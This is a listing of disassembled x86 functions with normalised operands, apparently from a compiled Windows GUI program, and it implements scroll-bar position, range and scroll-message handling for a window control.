mov [ fs : eax ] edx
push sub_4546b8
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
sub_4546c0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_454750
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41471c
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_455018
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_454ff8
mov edx [ edi + 0xc ]
mov eax ebx
call sub_454ea8
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4547a0
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_454958
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43daec
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_454ea8
xor edx edx
mov eax ebx
call sub_454ea8
jmp r-xdata
sub_4547d8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_425310
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_454844
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_425310
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4548ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_454fe0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_440990
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_454fe0
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_440954
call sub_454844
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_440954
call sub_4547d8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_454958
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_443c60
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_454990
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_443c60
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_4549c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_454990
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_454990
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_454a40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_443c60
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_4549c4
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43ce88
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_4549c4
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43cecc
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_454ad8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_443c60
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_454b38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_454d09 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_454a40
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_454a40
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
push ebp
call sub_454ad8
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
push ebp
call sub_454ad8
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_4068f0
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_454ea8
jmp r-xdata
sub_454e30
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_455520
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_454ea8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_443c60
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_443c60
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_443818
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_443818
jmp r-xdata
call sub_454618
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_454f6c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_455520
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_455024
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443c60
push eax
call sub_427d24
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443c60
push eax
call sub_427d24
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443c60
push eax
call sub_427d24
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41d9c0
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443c60
push eax
call sub_427d24
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443c60
push eax
call sub_427d24
sub_45512c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_454a40
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_454a40
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_455024
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443c60
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_454ea8
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_454a40
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_455244
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43f98c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4546c0
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4546c0
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4552bc
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403124
mov eax [ esi + 0x20c ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43fab0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_455308
push ebx
mov ebx eax
mov eax ebx
call sub_440c18
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_455520
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40be98
test al al
jne r-xdata
mov eax ebx
call sub_443c60
push eax
call sub_427d58
sub_455348
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4554a0
mov ecx edi
mov edx esi
mov eax ebx
call sub_440360
pop edi
pop esi
pop ebx
retn
sub_455388
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_455490
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43ce88
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_454958
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_454ea8
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440954
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440954
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_413fac
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43cbf4
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455497
mov eax [ ebp - 0x10 ]
call sub_403124
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4547a0
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_414108
xor ecx ecx
mov edx 0xb03e
call sub_43e62c
inc ebx
dec esi
jne r-xdata
sub_4554c4
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_454ff8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_454ff8
mov eax ebx
call sub_4554a0
jmp r-xdata
sub_455520
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_443f64
test al al
je r-xdata
xor eax eax
push ebp
push sub_45560b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_454ac0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_454ac0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_45512c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_45512c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_45512c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45512c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_45512c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45512c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_455630
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43cf9c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43cfc8
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43cf9c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43cfc8
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43ce88
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_454ea8
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43ce88
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43cecc
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_454ea8
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_43ce88
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_454ea8
mov eax ebx
call sub_43ce88
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43cecc
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_43cecc
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_454ea8
mov eax ebx
call sub_43cecc
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_455784
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
